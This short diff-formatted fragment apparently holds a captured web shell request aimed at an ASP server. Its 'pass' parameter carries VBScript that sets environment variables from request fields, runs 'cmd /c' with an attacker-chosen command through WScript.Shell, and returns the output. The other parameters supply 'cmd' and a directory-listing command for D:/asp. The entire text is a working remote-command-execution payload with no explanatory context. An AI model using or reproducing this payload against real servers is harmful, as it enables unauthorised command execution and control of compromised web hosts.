@@ -1,0 +1,4 @@
+pass=Set PutEnv=CreateObject("WScript.Shell").Environment("Process"):envstr=Split(""&bd(Request("faa63fc2e5289a"))&"", "|||asline|||"):For Each envline in envstr:If Len(envline)>0 Then:ss=Split(envline, "|||askey|||"):PutEnv(ss(0))=ss(1):End If:Next:Set X=CreateObject("wscript.shell").exec(""""&bd(Request("p49cc84f6e8af3"))&""" /c """&bd(Request("n7d0cba0c72437"))&""""):If Err Then:S="[Err] "&Err.Description:Err.Clear:Else:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&E:End If:Response.write(S)
+n7d0cba0c72437=cd /d "D:/asp"&ls&echo a8f353&cd&echo df191c3df3
+p49cc84f6e8af3=cmd
+faa63fc2e5289a=
